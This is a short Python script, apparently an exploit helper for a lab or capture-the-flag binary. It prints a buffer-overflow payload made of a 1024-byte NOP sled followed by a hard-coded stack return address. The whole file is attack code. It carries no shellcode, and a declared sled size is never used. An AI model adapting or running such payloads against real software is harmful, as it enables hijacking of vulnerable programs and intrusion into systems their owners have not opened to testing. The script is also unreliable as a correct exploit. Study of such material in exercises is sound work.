import sys

sledSize = 204
bufferSize = 1024

payload = b'\x90'*bufferSize # nop sled
payload += b'\x8c\xdb\xff\xff\xff\x7f'

sys.stdout.buffer.write(payload)